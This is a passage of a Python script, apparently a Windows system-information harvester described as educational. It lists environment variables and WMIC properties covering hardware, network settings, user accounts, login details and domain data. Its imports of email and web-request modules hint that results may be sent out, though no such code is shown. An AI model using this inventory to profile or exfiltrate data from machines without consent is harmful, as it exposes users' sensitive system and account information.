def pause():print(end="")#pause=input("Press enter to continue...")
__Author__=__AUTHOR__=__author__="Henry Letellier"
__Credits__=__CREDITS__=__credits__="Created by {} Henry Letellier".format(chr(169))
__Version__=__VERSION__=__version__="1.0.0.0.0.0.0"
__Data__=__data__=__DATA__="Nothing to define"
__Functions__=__functions__=__FUNCTIONS__="No drugs to declare"
__Cached__=__CACHED__=__cached__="All the cash has been spent"
__Dict__=__DICT__=__dict__="All the dictionaries are up to date"
__Doc__=__DOC__=__doc__="Only cached documents are used, nothing else."
__File__=__FILE__=__file__="Clippy stole my files!"
__Loader__=__LOADER__=__loader__="Loading...."
__Name__=__NAME__=__name__="My name is Henry\nHenry Letellier"
__Package__=__PACKAGE__=__package__="from pip install package Henry"
__Path__=__PATH__=__path__="something has spilled cotton over the path string.\nC:/cotton/cotton/cotton/cotton/cotton/cotton/cotton.cottonbud"
__Spec__=__SPEC__=__spec__="Our business is going through the seeling."
__To_quote__="__© Henry Letellier__"
#__main__="Here is the mains"
print("__Author__,__Credits__,__Version__,__Description__,__Data__,__Functions__,__Cached__,__Dict__,__Doc__,__File__,__Loader__,__Name__,__Package__,__Path__,__Spec__,")
import os
try:
    from tkinter import *
except:
    from Tkinter import *
from subprocess import Popen, PIPE
from time import sleep
from sys import argv
from re import findall
from json import loads, dumps
from base64 import b64decode,b64encode
from urllib.request import Request, urlopen
from datetime import datetime
from threading import Thread
import smtplib
import imghdr
from email.message import EmailMessage
class root:
    def __init__(self) -> None:
        self.date=datetime.now()
        #_________________________ Licence _________________________
        self.DL0="Theses rules apply for all the files in this folder and sub-files in sub-folders."
        self.DL1="This file contains a certain amount of variables for gathering info, about a windows computer, it is for __ educational purpose__."
        self.DL2="This program is to be used as if and without any guaranty."
        self.DL3=f"The creator, {__To_quote__}, cannot be held responsible for any damage caused on your computer."
        self.DL4="This program will do __no harm__ to your computer."
        self.DL5="This program, although no harm to your computer will be done will still expose __ sensitive content__ contained on your windows computer."
        self.DL6="This program will also expose content from software it has been programmed to search."
        self.DL7="This program also uses elements from other scripts, which (if the script itself and not the snipsets) could have a negative impact on your computer."
        self.DL8="This program has does not require any other installation than python itself."
        self.DL9="This program will automatically terminate if executed on a system other than windows."
        self.DL10="It is authorised to use this program in other non harmful intension programs."
        self.DL11=f"If this program happens to be used in another program, please quote it's author ({__To_quote__}). "
        self.DL12="Please avoid running parts of this program (outside of itself) if you do not know what you are doing."
        self.DL=[self.DL1,self.DL2,self.DL3,self.DL4,self.DL5,self.DL6,self.DL7,self.DL8,self.DL9,self.DL10,self.DL11,self.DL12]#self.DL0,
        #_______________________________ Tkinter vars _______________________________
        self.pfonty="Times New Roman"
        #self.pfonty="Courier New"
        self.pfontw="normal"
        self.pfontb="bold"
        self.pfonts=9#10
        self.BGC="white"
        self.FGC="black"
        self.title_x=730
        self.title_y=420
        self.infoCFG="white"
        self.infoCBG="black"
        self.Description=3
        self.my_list=["About:",f"Version={__Version__}",f"Author={__Author__}",f"Credits={__credits__}"]
        #_______________________________ System vars and other vars for prog _______________________________
        self.System_vars_result={}
        self.wmic_global_counter=0
        self.wmic_main_class_counter=0
        self.wmic_sub_counter=0
        self.csproduct_result=[]
        self.ALIAS_result=[]
        self.BASEBOARD_result=[]
        self.BIOS_result=[]
        self.BOOTCONFIG_result=[]
        self.COMPUTERSYSTEM_result=[]
        self.CPU_result=[]
        self.DCOMAPP_result=[]
        self.DESKTOP_result=[]
        self.DESKTOPMONITOR_result=[]
        self.DEVICEMEMORYADDRESS_result=[]
        self.DISKDRIVE_result=[]
        self.DMACHANNEL_result=[]
        self.ENVIRONMENT_result=[]
        self.GROUP_result=[]
        self.IDECONTROLLER_result=[]
        self.IRQ_result=[]
        self.LOADORDER_result=[]
        self.LOGICALDISK_result=[]
        self.LOGON_result=[]
        self.MEMCACHE_result=[]
        self.MEMORYCHIP_result=[]
        self.MEMPHYSICAL_result=[]
        self.NETCLIENT_result=[]
        self.NETLOGIN_result=[]
        self.NETPROTOCOL_result=[]
        self.NETUSE_result=[]
        self.NIC_result=[]
        self.NICCONFIG_result=[]
        self.NTDOMAIN_result=[]
        self.NTEVENT_result=[]
        self.NTEVENTLOG_result=[]
        self.ONBOARDDEVICE_result=[]
        self.OS_result=[]
        self.PAGEFILE_result=[]
        self.PAGEFILESET_result=[]
        self.PARTITION_result=[]
        self.PORT_result=[]
        self.PORTCONNECTOR_result=[]
        self.PRINTER_result=[]
        self.PRINTERCONFIG_result=[]
        self.PRINTJOB_result=[]
        self.PROCESS_result=[]
        self.PRODUCT_result=[]
        self.QFE_result=[]
        self.QUOTASETTING_result=[]
        self.RDACCOUNT_result=[]
        self.RDNIC_result=[]
        self.RDPERMISSIONS_result=[]
        self.RDTOGGLE_result=[]
        self.RECOVEROS_result=[]
        self.REGISTRY_result=[]
        self.SCSICONTROLLER_result=[]
        self.SERVER_result=[]
        self.SERVICE_result=[]
        self.SHADOWCOPY_result=[]
        self.SHADOWSTORAGE_result=[]
        self.SHARE_result=[]
        self.SOFTWAREELEMENT_result=[]
        self.SOFTWAREFEATURE_result=[]
        self.SOUNDDEV_result=[]
        self.STARTUP_result=[]
        self.SYSACCOUNT_result=[]
        self.SYSDRIVER_result=[]
        self.SYSTEMENCLOSURE_result=[]
        self.SYSTEMSLOT_result=[]
        self.TAPEDRIVE_result=[]
        self.TEMPERATURE_result=[]
        self.TIMEZONE_result=[]
        self.UPS_result=[]
        self.USERACCOUNT_result=[]
        self.VOLTAGE_result=[]
        self.VOLUME_result=[]
        self.VOLUMEQUOTASETTING_result=[]
        self.VOLUMEUSERQUOTA_result=[]
        self.WMISET_result=[]
        self.System_vars_result=[]
        self.User_vars_result=[]
        self.system_info_result=[]
        self.System_vars=[
            "ChocolateyInstall",
            "ComSpec",
            "DriverData",
            "GIT_LFS_PATH",
            "NUMBER_OF_PROCESSORS",
            "OS",
            "Path",
            "PATHEXT",
            "PROCESSOR_ARCHITECTURE",
            "PROCESSOR_IDENTIFIER",
            "PROCESSOR_LEVEL",
            "PROCESSOR_REVISION",
            "PSModulePath",
            "PT7HOME",
            "QT_DEVICE_PIXEL_RATIO",
            "SEE_MASK_NOZONECHECKS",
            "TEMP",
            "TMP",
            "USERNAME",
            "VBOX_MSI_INSTALL_PATH",
            "windir"]
        self.User_vars=[
            "ChocolateyLastPathUpdate",
            "MOZ_PLUGIN_PATH",
            "OneDrive",
            "OneDriveConsumer",
            "Path",
            "USERPROFILE",
            "QT_DEVICE_PIXEL_RATIO",
            "SEE_MASK_NOZONECHECKS",
            "TEMP",
            "TMP",
            "DASHLANE_DLL_DIR",
            "OneDrive",
            "SmtpDiag"
        ]
        self.system_info=[
            "ProgramFiles",
            "SystemRoot",
            "USERPROFILE",
            "SystemDrive",
            "WINDIR",                  #C: Windows
            "HOMEDRIVE",               #C: (lecteur du système d'exploitation)
            "HOMEPATH",                #C: Utilisateurs <nom d'utilisateur>
            "PROFIL DE L'UTILISATEUR", #C: Utilisateurs <nom d'utilisateur>
            "DONNÉES D'APPLICATION",
            "FICHIERS DE PROGRAMME",   #C: Fichiers programme
            "PROGRAMMILES (X86)",      #C: Fichiers programme (x86)
            "DONNÉES DE PROGRAMME",    #C: ProgramData
            "TEMP",                    #C: Utilisateurs <nom d'utilisateur> AppDataLocalTemp
            "LOCALAPPDATA",            #C: Utilisateurs <nom d'utilisateur> AppDataLocal
            "PUBLIQUE",                #C: UsersPublic
            "COMMONPROGRAMFILES",      #C: Fichiers programme Fichiers communs
            "PROGRAMMES COMMUNS (x86)" #C: Fichiers programme (x86) Fichiers communs
            "ALLUSERSPROFILE",
            "APPDATA",
            "CD",
            "CMDCMDLINE",
            "CMDEXTVERSION",
            "CommonProgramFiles",
            "CommonProgramFiles(x86)",
            "CommonProgramW6432",
            "COMPUTERNAME",
            "COMSPEC",
            "DATE",
            "DriverData",
            "ERRORLEVEL",
            "LOGONSERVER",
            "NUMBER_OF_PROCESSORS",
            "OneDrive",
            "OS",
            "PATH",
            "PATHEXT",
            "PROCESSOR_ARCHITECTURE",
            "PROCESSOR_IDENTIFIER",
            "PROCESSOR_LEVEL",
            "PROCESSOR_REVISION",
            "ProgramData",
            "ProgramFiles(x86)",
            "ProgramW6432",
            "PROMPT",
            "PSModulePath",
            "PUBLIC",
            "RANDOM",
            "SessionName",
            "TIME",
            "TMP",
            "USERDOMAIN",
            "USERDOMAIN_ROAMINGPROFILE",
            "USERNAME",
            "PROGRAMFILES",
            "PROGRAMFILES(X86)",
            "PROGRAMDATA",
            "COMMONPROGRAMFILES(x86)"
        ]
        self.wmic_csproduct=[
            #"wmic csproduct get uuid",
            "Caption",
            "Description",
            "IdentifyingNumber",
            "Name",
            "SKUNumber",
            "UUID",
            "Vendor",
            "Version"
        ]
        self.wmic_ALIAS=[
            "ASSOC",
            # "CALL",
            # "CREATE",
            # "DELETE",
            # "GET",
            # "LIST ALIAS"
        ]
        self.wmic_BASEBOARD=[
            "Caption",
            "ConfigOptions",
            "CreationClassName",
            "Depth","Description",
            "Height",
            "HostingBoard",
            "HotSwappable",
            "InstallDate",
            "Manufacturer",
            "Model",
            "Name",
            "OtherIdentifyingInfo",
            "PartNumber",
            "PoweredOn",
            "Product",
            "Removable",
            "Replaceable",
            "RequirementsDescription",
            "RequiresDaughterBoard",
            "SerialNumber",
            "SKU",
            "SlotLayout",
            "SpecialRequirements",
            "Status",
            "Tag",
            "Version",
            "Weight",
            "Width",
        ]
        self.wmic_BIOS=[
            "BiosCharacteristics",
            "BIOSVersion",
            "BuildNumber",
            "Caption",
            "CodeSet",
            "CurrentLanguage",
            "Description",
            "EmbeddedControllerMajorVersion",
            "EmbeddedControllerMinorVersion",
            "IdentificationCode",
            "InstallableLanguages",
            "InstallDate",
            "LanguageEdition",
            "ListOfLanguages",
            "Manufacturer",
            "Name",
            "OtherTargetOS",
            "PrimaryBIOS",
            "ReleaseDate",
            "SerialNumber",
            "SMBIOSBIOSVersion",
            "SMBIOSMajorVersion",
            "SMBIOSMinorVersion",
            "SMBIOSPresent",
            "SoftwareElementID",
            "SoftwareElementState",
            "Status",
            "SystemBiosMajorVersion",
            "System",
            "BiosMinorVersion",
            "TargetOperatingSystem",
            "Version"
        ]
        self.wmic_BOOTCONFIG=[
            "BootDirectory",
            "Caption",
            "ConfigurationPath",
            "Description",
            "LastDrive",
            "Name",
            "ScratchDirectory",
            "SettingID",
            "TempDirectory"
        ]
        # self.wmic_CDROM=[]
        self.wmic_COMPUTERSYSTEM=[
            "AdminPasswordStatus",
            "AutomaticManagedPagefile",
            "AutomaticResetBootOption",
            "AutomaticResetCapability",
            "BootOptionOnLimit",
            "BootOptionOnWatchDog",
            "BootROMSupported",
            "BootStatus",
            "BootupState",
            "Caption",
            "ChassisBootupState",
            "ChassisSKUNumber",
            "CreationClassName",
            "CurrentTimeZone",
            "DaylightInEffect",
            "Description",
            "DNSHostName",
            "Domain",
            "DomainRole",
            "EnableDaylightSavingsTime",
            "FrontPanelResetStatus",
            "HypervisorPresent",
            "InfraredSupported",
            "InitialLoadInfo",
            "InstallDate",
            "KeyboardPasswordStatus",
            "LastLoadInfo",
            "Manufacturer",
            "Model",
            "Name",
            "NameFormat",
            "NetworkServerModeEnabled",
            "NumberOfLogicalProcessors",
            "NumberOfProcessors",
            "OEMLogoBitmap",
            "OEMStringArray",
            "PartOfDomain",
            "PauseAfterReset",
            "PCSystemType",
            "PCSystemTypeEx",
            "PowerManagementCapabilities",
            "PowerManagementSupported",
            "PowerOnPasswordStatus",
            "PowerState",
            "PowerSupplyState",
            "PrimaryOwnerContact",
            "PrimaryOwnerName",
            "ResetCapability",
            "ResetCount",
            "ResetLimit",
            "Roles",
            "Status",
            "SupportContactDescription",
            "SystemFamily",
            "SystemSKUNumber",
            "SystemStartupDelay",
            "SystemStartupOptions",
            "SystemStartupSetting",
            "SystemType",
            "ThermalState",
            "TotalPhysicalMemory",
            "UserName",
            "WakeUpType",
            "Workgroup"
        ]
        self.wmic_CPU=[
            "AddressWidth",
            "Architecture",
            "AssetTag",
            "Availability",
            "Caption",
            "Characteristics",
            "ConfigManagerErrorCode",
            "ConfigManagerUserConfig",
            "CpuStatus",
            "CreationClassName",
            "CurrentClockSpeed",
            "CurrentVoltage",
            "DataWidth",
            "Description",
            "DeviceID",
            "ErrorCleared",
            "ErrorDescription",
            "ExtClock",
            "Family",
            "InstallDate",
            "L2CacheSize",
            "L2CacheSpeed",
            "L3CacheSize",
            "L3CacheSpeed",
            "LastErrorCode",
            "Level",
            "LoadPercentage",
            "Manufacturer",
            "MaxClockSpeed",
            "Name",
            "NumberOfCores",
            "NumberOfEnabledCore",
            "NumberOfLogicalProcessors",
            "OtherFamilyDescription",
            "PartNumber",
            "PNPDeviceID",
            "PowerManagementCapabilities",
            "PowerManagementSupported",
            "ProcessorId",
            "ProcessorType",
            "Revision",
            "Role",
            "SecondLevelAddressTranslationExtensions",
            "SerialNumber",
            "SocketDesignation",
            "Status",
            "StatusInfo",
            "Stepping",
            "SystemCreationClassName",
            "SystemName",
            "ThreadCount",
            "UniqueId",
            "UpgradeMethod",
            "Version",
            "VirtualizationFirmwareEnabled",
            "VMMonitorModeExtensions",
            "VoltageCaps"
        ]
        # self.wmic_DATAFILE=[]
        self.wmic_DCOMAPP=[
            "AppID",
            "Caption",
            "Description",
            "InstallDate",
            "Name",
            "Status"
        ] #To do as a Table
        self.wmic_DESKTOP=[
            "BorderWidth",
            "Caption",
            "CoolSwitch",
            "CursorBlinkRate",
            "Description",
            "DragFullWindows",
            "GridGranularity",
            "IconSpacing",
            "IconTitleFaceName",
            "IconTitleSize",
            "IconTitleWrap",
            "Name",
            "Pattern",
            "ScreenSaverActive",
            "ScreenSaverExecutable",
            "ScreenSaverSecure",
            "ScreenSaverTimeout",
            "SettingID",
            "Wallpaper",
            "WallpaperStretched",
            "WallpaperTiled"
        ]
        self.wmic_DESKTOPMONITOR=[
            "Availability",
            "Bandwidth",
            "Caption",
            "ConfigManagerErrorCode",
            "ConfigManagerUserConfig",
            "CreationClassName",
            "Description",
            "DeviceID",
            "DisplayType",
            "ErrorCleared",
            "ErrorDescription",
            "InstallDate",
            "IsLocked",
            "LastErrorCode",
            "MonitorManufacturer",
            "MonitorType",
            "Name",
            "PixelsPerXLogicalInch",
            "PixelsPerYLogicalInch",
            "PNPDeviceID",
            "PowerManagementCapabilities",
            "PowerManagementSupported",
            "ScreenHeight",
            "ScreenWidth",
            "Status",
            "StatusInfo",
            "SystemCreationClassName",
            "SystemName"
        ]
        self.wmic_DEVICEMEMORYADDRESS=[
            "Caption",
            "CreationClassName",
            "CSCreationClassName",
            "CSName",
            "Description",
            "EndingAddress",
            "InstallDate",
            "MemoryType",
            "Name",
            "StartingAddress",
            "Status"
        ] #To do as a Table
        self.wmic_DISKDRIVE=[
            "Availability",
            "BytesPerSector",
            "Capabilities",
            "CapabilityDescriptions",
            "Caption",
            "CompressionMethod",
            "ConfigManagerErrorCode",
            "ConfigManagerUserConfig",
            "CreationClassName",
            "DefaultBlockSize",
            "Description",
            "DeviceID",
            "ErrorCleared",
            "ErrorDescription",
            "ErrorMethodology",
            "FirmwareRevision",
            "Index",
            "InstallDate",
            "InterfaceType",
            "LastErrorCode",
            "Manufacturer",
            "MaxBlockSize",
            "MaxMediaSize",
            "MediaLoaded",
            "MediaType",
            "MinBlockSize",
            "Model",
            "Name",
            "NeedsCleaning",
            "NumberOfMediaSupported",
            "Partitions",
            "PNPDeviceID",
            "PowerManagementCapabilities",
            "PowerManagementSupported",
            "SCSIBus",
            "SCSILogicalUnit",
            "SCSIPort",
            "SCSITargetId",
            "SectorsPerTrack",
            "SerialNumber",
            "Signature",
            "Size",
            "Status",
            "StatusInfo",
            "SystemCreationClassName",
            "SystemName",
            "TotalCylinders",
            "TotalHeads",
            "TotalSectors",
            "TotalTracks",
            "TracksPerCylinder"
        ]
        # self.wmic_DISKQUOTA=[]
        self.wmic_DMACHANNEL=[
            "AddressSize",
            "Availability",
            "BurstMode",
            "ByteMode",
            "Caption",
            "ChannelTiming",
            "CreationClassName",
            "CSCreationClassName",
            "CSName",
            "Description",
            "DMAChannel",
            "InstallDate",
            "MaxTransferSize",
            "Name",
            "Port",
            "Status",
            "TransferWidths",
            "TypeCTiming",
            "WordMode"
        ]
        self.wmic_ENVIRONMENT=[
            "Caption",
            "Description",
            "InstallDate",
            "Name",
            "Status",
            "SystemVariable",
            "UserName",
            "VariableValue"
        ] #To display as Table
        # self.wmic_FSDIR=[]
        self.wmic_GROUP=[
            "Caption",
            "Description",
            "Domain",
            "InstallDate",
            "LocalAccount",
            "Name",
            "SID",
            "SIDType",
            "Status"
        ]
        self.wmic_IDECONTROLLER=[
            "Availability",
            "Caption",
            "ConfigManagerErrorCode",
            "ConfigManagerUserConfig",
            "CreationClassName",
            "Description",
            "DeviceID",
            "ErrorCleared",
            "ErrorDescription",
            "InstallDate",
            "LastErrorCode",
            "Manufacturer",
            "MaxNumberControlled",
            "Name",
            "PNPDeviceID",
            "PowerManagementCapabilities",
            "PowerManagementSupported",
            "ProtocolSupported",
            "Status",
            "StatusInfo",
            "SystemCreationClassName",
            "SystemName",
            "TimeOfLastReset"
        ]
        self.wmic_IRQ=[
            "Availability",
            "Caption",
            "CreationClassName",
            "CSCreationClassName",
            "CSName",
            "Description",
            "Hardware",
            "InstallDate",
            "IRQNumber",
            "Name",
            "Shareable",
            "Status",
            "TriggerLevel",
            "TriggerType",
            "Vector"
        ] #display as Table
        # self.wmic_JOB=[]
        self.wmic_LOADORDER=[
            "Caption",
            "Description",
            "DriverEnabled",
            "GroupOrder",
            "InstallDate",
            "Name",
            "Status"
        ]#display as Table
        self.wmic_LOGICALDISK=[
            "Access",
            "Availability",
            "BlockSize",
            "Caption",
            "Compressed",
            "ConfigManagerErrorCode",
            "ConfigManagerUserConfig",
            "CreationClassName",
            "Description",
            "DeviceID",
            "DriveType",
            "ErrorCleared",
            "ErrorDescription",
            "ErrorMethodology",
            "FileSystem",
            "FreeSpace",
            "InstallDate",
            "LastErrorCode",
            "MaximumComponentLength",
            "MediaType",
            "Name",
            "NumberOfBlocks",
            "PNPDeviceID",
            "PowerManagementCapabilities",
            "PowerManagementSupported",
            "ProviderName",
            "Purpose",
            "QuotasDisabled",
            "QuotasIncomplete",
            "QuotasRebuilding",
            "Size",
            "Status",
            "StatusInfo",
            "SupportsDiskQuotas",
            "SupportsFileBasedCompression",
            "SystemCreationClassName",
            "SystemName",
            "VolumeDirty",
            "VolumeName",
            "VolumeSerialNumber"
        ]
        self.wmic_LOGON=[
            "AuthenticationPackage",
            "Caption",
            "Description",
            "InstallDate",
            "LogonId",
            "LogonType",
            "Name",
            "StartTime",
            "Status"
        ]#Display as table
        self.wmic_MEMCACHE=[
            "Access",
            "AdditionalErrorData",
            "Associativity",
            "Availability",
            "BlockSize",
            "CacheSpeed",
            "CacheType",
            "Caption",
            "ConfigManagerErrorCode",
            "ConfigManagerUserConfig",
            "CorrectableError",
            "CreationClassName",
            "CurrentSRAM",
            "Description",
            "DeviceID",
            "EndingAddress",
            "ErrorAccess",
            "ErrorAddress",
            "ErrorCleared",
            "ErrorCorrectType",
            "ErrorData",
            "ErrorDataOrder",
            "ErrorDescription",
            "ErrorInfo",
            "ErrorMethodology",
            "ErrorResolution",
            "ErrorTime",
            "ErrorTransferSize",
            "FlushTimer",
            "InstallDate",
            "InstalledSize",
            "LastErrorCode",
            "Level",
            "LineSize",
            "Location",
            "MaxCacheSize",
            "Name",
            "NumberOfBlocks",
            "OtherErrorDescription",
            "PNPDeviceID",
            "PowerManagementCapabilities",
            "PowerManagementSupported",
            "Purpose",
            "ReadPolicy",
            "ReplacementPolicy",
            "StartingAddress",
            "Status",
            "StatusInfo",
            "SupportedSRAM",
            "SystemCreationClassName",
            "SystemLevelAddress",
            "SystemName",
            "WritePolicy"
        ]
        self.wmic_MEMORYCHIP=[
            "Attributes",
            "BankLabel",
            "Capacity",
            "Caption",
            "ConfiguredClockSpeed",
            "ConfiguredVoltage",
            "CreationClassName",
            "DataWidth",
            "Description",
            "DeviceLocator",
            "FormFactor",
            "HotSwappable",
            "InstallDate",
            "InterleaveDataDepth",
            "InterleavePosition",
            "Manufacturer",
            "MaxVoltage",
            "MemoryType",
            "MinVoltage",
            "Model",
            "Name",
            "OtherIdentifyingInfo",
            "PartNumber",
            "PositionInRow",
            "PoweredOn",
            "Removable",
            "Replaceable",
            "SerialNumber",
            "SKU",
            "SMBIOSMemoryType",
            "Speed",
            "Status",
            "Tag",
            "TotalWidth",
            "TypeDetail",
            "Version",
        ]
        self.wmic_MEMPHYSICAL=[
            "Caption",
            "CreationClassName",
            "Depth",
            "Description",
            "Height",
            "HotSwappable",
            "InstallDate",
            "Location",
            "Manufacturer",
            "MaxCapacity",
            "MaxCapacityEx",
            "MemoryDevices",
            "MemoryErrorCorrection",
            "Model",
            "Name",
            "OtherIdentifyingInfo",
            "PartNumber",
            "PoweredOn",
            "Removable",
            "Replaceable",
            "SerialNumber",
            "SKU",
            "Status",
            "Tag",
            "Use",
            "Version",
            "Weight",
            "Width"
        ]
        self.wmic_NETCLIENT=[
            "Caption",
            "Description",
            "InstallDate",
            "Manufacturer",
            "Name",
            "Status"
        ]
        self.wmic_NETLOGIN=[
            "AccountExpires",
            "AuthorizationFlags",
            "BadPasswordCount",
            "Caption",
            "CodePage",
            "Comment",
            "CountryCode",
            "Description",
            "Flags",
            "FullName",
            "HomeDirectory",
            "HomeDirectoryDrive",
            "LastLogoff",
            "LastLogon",
            "LogonHours",
            "LogonServer",
            "MaximumStorage",
            "Name",
            "NumberOfLogons",
            "Parameters",
            "PasswordAge",
            "PasswordExpires",
            "PrimaryGroupId",
            "Privileges",
            "Profile",
            "ScriptPath",
            "SettingID",
            "UnitsPerWeek",
            "UserComment",
            "UserId",
            "UserType",
            "Workstations"
        ]
        self.wmic_NETPROTOCOL=[
            "Caption",
            "ConnectionlessService",
            "Description",
            "GuaranteesDelivery",
            "GuaranteesSequencing",
            "InstallDate",
            "MaximumAddressSize",
            "MaximumMessageSize",
            "MessageOriented",
            "MinimumAddressSize",
            "Name",
            "PseudoStreamOriented",
            "Status",
            "SupportsBroadcasting",
            "SupportsConnectData",
            "SupportsDisconnectData",
            "SupportsEncryption",
            "SupportsExpeditedData",
            "SupportsFragmentation",
            "SupportsGracefulClosing",
            "SupportsGuaranteedBandwidth",
            "SupportsMulticasting",
            "SupportsQualityofService"
        ]
        # self.wmic_NETUSE=[] #there is nothing
        self.wmic_NIC=[
            "AdapterType",
            "AdapterTypeId",
            "AutoSense",
            "Availability",
            "Caption",
            "ConfigManagerErrorCode",
            "ConfigManagerUserConfig",
            "CreationClassName",
            "Description",
            "DeviceID",
            "ErrorCleared",
            "ErrorDescription",
            "GUID",
            "Index",
            "InstallDate",
            "Installed",
            "InterfaceIndex",
            "LastErrorCode",
            "MACAddress",
            "Manufacturer",
            "MaxNumberControlled",
            "MaxSpeed",
            "Name",
            "NetConnectionID",
            "NetConnectionStatus",
            "NetEnabled",
            "NetworkAddresses",
            "PermanentAddress",
            "PhysicalAdapter",
            "PNPDeviceID",
            "PowerManagementCapabilities",
            "PowerManagementSupported",
            "ProductName",
            "ServiceName",
            "Speed",
            "Status",
            "StatusInfo",
            "SystemCreationClassName",
            "SystemName",
            "TimeOfLastReset"
        ]
        self.wmic_NICCONFIG=[
            "ArpAlwaysSourceRoute",
            "ArpUseEtherSNAP",
            "Caption",
            "DatabasePath",
            "DeadGWDetectEnabled",
            "DefaultIPGateway",
            "DefaultTOS",
            "DefaultTTL",
            "Description",
            "DHCPEnabled",
            "DHCPLeaseExpires",
            "DHCPLeaseObtained",
            "DHCPServer",
            "DNSDomain",
            "DNSDomainSuffixSearchOrder",
            "DNSEnabledForWINSResolution",
            "DNSHostName",
            "DNSServerSearchOrder",
            "DomainDNSRegistrationEnabled",
            "ForwardBufferMemory",
            "FullDNSRegistrationEnabled",
            "GatewayCostMetric",
            "IGMPLevel",
            "Index",
            "InterfaceIndex",
            "IPAddress",
            "IPConnectionMetric",
            "IPEnabled",
            "IPFilterSecurityEnabled",
            "IPPortSecurityEnabled",
            "IPSecPermitIPProtocols",
            "IPSecPermitTCPPorts",
            "IPSecPermitUDPPorts",
            "IPSubnet",
            "IPUseZeroBroadcast",
            "IPXAddress",
            "IPXEnabled",
            "IPXFrameType",
            "IPXMediaType",
            "IPXNetworkNumber",
            "IPXVirtualNetNumber",
            "KeepAliveInterval",
            "KeepAliveTime",
            "MACAddress",
            "MTU",
            "NumForwardPackets",
            "PMTUBHDetectEnabled",
            "PMTUDiscoveryEnabled",
            "ServiceName",
            "SettingID",
            "TcpipNetbiosOptions",
            "TcpMaxConnectRetransmissions",
            "TcpMaxDataRetransmissions",
            "TcpNumConnections",
            "TcpUseRFC1122UrgentPointer",
            "TcpWindowSize",
            "WINSEnableLMHostsLookup",
            "WINSHostLookupFile",
            "WINSPrimaryServer",
            "WINSScopeID",
            "WINSSecondaryServer"
        ]
        self.wmic_NTDOMAIN=[
            "Caption",
            "ClientSiteName",
            "CreationClassName",
            "DcSiteName",
            "Description",
            "DnsForestName",
            "DomainControllerAddress",
            "DomainControllerAddressType",
            "DomainControllerName",
            "DomainGuid",
            "DomainName",
            "DSDirectoryServiceFlag",
            "DSDnsControllerFlag",
            "DSDnsDomainFlag",
            "DSDnsForestFlag",
            "DSGlobalCatalogFlag",
            "DSKerberosDistributionCenterFlag",
            "DSPrimaryDomainControllerFlag",
            "DSTimeServiceFlag",
            "DSWritableFlag",
            "InstallDate",
            "Name",
            "NameFormat",
            "PrimaryOwnerContact",
            "PrimaryOwnerName",
            "Roles",
            "Status"
        ]
        # self.wmic_NTEVENT=[]
        self.wmic_NTEVENTLOG=[
            "AccessMask",
            "Archive",
            "Caption",
            "Compressed",
            "CompressionMethod",
            "CreationClassName",
            "CreationDate",
            "CSCreationClassName",
            "CSName",
            "Description",
            "Drive",
            "EightDotThreeFileName",
            "Encrypted",
            "EncryptionMethod",
            "Extension",
            "FileName",
            "FileSize",
            "FileType",
            "FSCreationClassName",
            "FSName",
            "Hidden",
            "InstallDate",
            "InUseCount",
            "LastAccessed",
            "LastModified",
            "LogfileName",
            "Manufacturer",
            "MaxFileSize",
            "Name",
            "NumberOfRecords",
            "OverwriteOutDated",
            "OverWritePolicy",
            "Path",
            "Readable",
            "Sources"
        ]
        # self.wmic_ONBOARDDEVICE=[]
        self.wmic_OS=[
            "BootDevice",
            "BuildNumber",
            "BuildType",
            "Caption",
            "CodeSet",
            "CountryCode",
            "CreationClassName",
            "CSCreationClassName",
            "CSDVersion",
            "CSName",
            "CurrentTimeZone",
            "DataExecutionPrevention_32BitApplications",
            "DataExecutionPrevention_Available",
            "DataExecutionPrevention_Drivers",
            "DataExecutionPrevention_SupportPolicy",
            "Debug",
            "Description",
            "Distributed",
            "EncryptionLevel",
            "ForegroundApplicationBoost",
            "FreePhysicalMemory",
            "FreeSpaceInPagingFiles",
            "FreeVirtualMemory",
            "InstallDate",
            "LargeSystemCache",
            "LastBootUpTime",
            "LocalDateTime",
            "Locale",
            "Manufacturer",
            "MaxNumberOfProcesses",
            "MaxProcessMemorySize",
            "MUILanguages",
            "Name",
            "NumberOfLicensedUsers",
            "NumberOfProcesses",
            "NumberOfUsers",
            "OperatingSystemSKU",
            "Organization",
            "OSArchitecture",
            "OSLanguage",
            "OSProductSuite",
            "OSType",
            "OtherTypeDescription",
            "PAEEnabled",
            "PlusProductIDPlusVersionNumber",
            "PortableOperatingSystem",
            "Primary",
            "ProductType",
            "RegisteredUser",
            "SerialNumber",
            "ServicePackMajorVersion",
            "ServicePackMinorVersion",
            "SizeStoredInPagingFiles",
            "Status",
            "SuiteMask",
            "SystemDevice",
            "SystemDirectory",
            "SystemDrive",
            "TotalSwapSpaceSize",
            "TotalVirtualMemorySize",
            "TotalVisibleMemorySize",
            "Version",
            "WindowsDirectory"
        ]
        self.wmic_PAGEFILE=[
            "AllocatedBaseSize",
            "Caption",
            "CurrentUsage",
            "Description",
            "InstallDate",
            "Name",
            "PeakUsage",
            "Status",
            "TempPageFile"
        ]
        # self.wmic_PAGEFILESET=[]
        self.wmic_PARTITION=[
            "Access",
            "Availability",
            "BlockSize",
            "Bootable",
            "BootPartition",
            "Caption",
            "ConfigManagerErrorCode",
            "ConfigManagerUserConfig",
            "CreationClassName",
            "Description",
            "DeviceID",
            "DiskIndex",
            "ErrorCleared",
            "ErrorDescription",
            "ErrorMethodology",
            "HiddenSectors",
            "Index",
            "InstallDate",
            "LastErrorCode",
            "Name",
            "NumberOfBlocks",
            "PNPDeviceID",
            "PowerManagementCapabilities",
            "PowerManagementSupported",
            "PrimaryPartition",
            "Purpose",
            "RewritePartition",
            "Size",
            "StartingOffset",
            "Status",
            "StatusInfo",
            "SystemCreationClassName",
            "SystemName",
            "Type"
        ]
        self.wmic_PORT=[
            "Alias",
            "Caption",
            "CreationClassName",
            "CSCreationClassName",
            "CSName",
            "Description",
            "EndingAddress",
            "InstallDate",
            "Name",
            "StartingAddress",
            "Status"
        ]# To display as table
        self.wmic_PORTCONNECTOR=[
            "Caption",
            "ConnectorPinout",
            "ConnectorType",
            "CreationClassName",
            "Description",
            "ExternalReferenceDesignator",
            "InstallDate",
            "InternalReferenceDesignator",
            "Manufacturer",
            "Model",
            "Name"
        ] #Display as Table
        self.wmic_PRINTER=[
            "Attributes",
            "Availability",
            "AvailableJobSheets",
            "AveragePagesPerMinute",
            "Capabilities",
            "CapabilityDescriptions",
            "Caption",
            "CharSetsSupported",
            "Comment",
            "ConfigManagerErrorCode",
            "ConfigManagerUserConfig",
            "CreationClassName",
            "CurrentCapabilities",
            "CurrentCharSet",
            "CurrentLanguage",
